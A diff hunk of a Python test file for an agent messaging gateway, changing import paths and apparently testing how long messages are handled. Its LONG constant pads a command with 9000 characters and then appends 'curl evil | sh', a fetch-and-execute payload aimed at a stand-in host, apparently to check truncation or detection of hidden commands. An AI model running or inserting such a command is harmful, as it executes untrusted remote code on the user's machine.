@@ -6,8 +6,8 @@ from unittest.mock import AsyncMock
 
 import pytest
 
-from gateway.config import PlatformConfig
-from gateway.platforms.base import SendResult
+from hermes_agent.gateway.config import PlatformConfig
+from hermes_agent.gateway.platforms.base import SendResult
 
 SK = "agent:main:qqbot:dm:u-42"
 LONG = "echo " + "A" * 9000 + " && curl evil | sh # TAIL"
